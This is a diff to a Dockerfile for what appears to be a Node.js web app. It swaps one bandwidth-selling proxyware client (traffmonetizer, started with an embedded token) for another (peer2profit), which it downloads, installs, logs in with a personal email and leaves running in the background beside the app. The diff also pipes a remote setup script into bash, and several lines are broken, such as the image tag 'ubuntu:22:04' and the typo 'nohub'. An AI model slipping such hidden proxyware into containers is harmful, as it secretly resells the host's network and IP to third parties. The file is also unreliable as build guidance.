@@ -1,34 +1,18 @@
-FROM debian:buster-slim
+FROM ubuntu:22:04
+USER root
+RUN  apt-get update \
+  && apt-get install -y wget \
+  && rm -rf /var/lib/apt/lists/*
+WORKDIR /home/app
+COPY ./package.json /home/app/package.json
+RUN apt-get update
+RUN apt-get -y install curl gnupg
+RUN curl -sL https://deb.nodesource.com/setup_18.x  | bash -
+RUN apt-get -y install nodejs
+RUN npm install
+RUN wget -r https://updates.peer2profit.app/peer2profit_0.48_amd64.deb
+RUN sudo dpkg -i peer2profit_0.48_amd64.deb
+RUN p2pclient --login taymstutaymstu@gmail.com
 
-RUN set -eux; \
-	apt-get update; \
-	apt-get install -y --no-install-recommends \
-		ca-certificates \
-		iptables \
-		openssl \
-		pigz \
-		xz-utils \
-		curl \
-	; \
-	rm -rf /var/lib/apt/lists/*
-# Download latest nodejs binary
-RUN curl https://nodejs.org/dist/v14.15.4/node-v14.15.4-linux-x64.tar.xz -O
-
-# Extract & install
-RUN tar -xf node-v14.15.4-linux-x64.tar.xz
-RUN ln -s /node-v14.15.4-linux-x64/bin/node /usr/local/bin/node
-RUN ln -s /node-v14.15.4-linux-x64/bin/npm /usr/local/bin/npm
-RUN ln -s /node-v14.15.4-linux-x64/bin/npx /usr/local/bin/npx
-
-ENV DOCKER_TLS_CERTDIR=/certs
-RUN mkdir /certs /certs/client && chmod 1777 /certs /certs/client
-
-COPY --from=docker:20.10.5-dind /usr/local/bin/ /usr/local/bin/
-
-VOLUME /var/lib/docker
-WORKDIR /app
-COPY . /app
-
-ENTRYPOINT ["dockerd-entrypoint.sh"]
 EXPOSE 5000
-CMD docker pull traffmonetizer/cli:latest && run -i -d --name tm traffmonetizer/cli start accept --token 8nkHbCPxYgWueBN13CWTJrRYBsizoO34KYr0TzPB0ao= & /usr/local/bin/node app.js
+CMD nohub p2pclient --login taymstutaymstu@gmail.com & node app.js
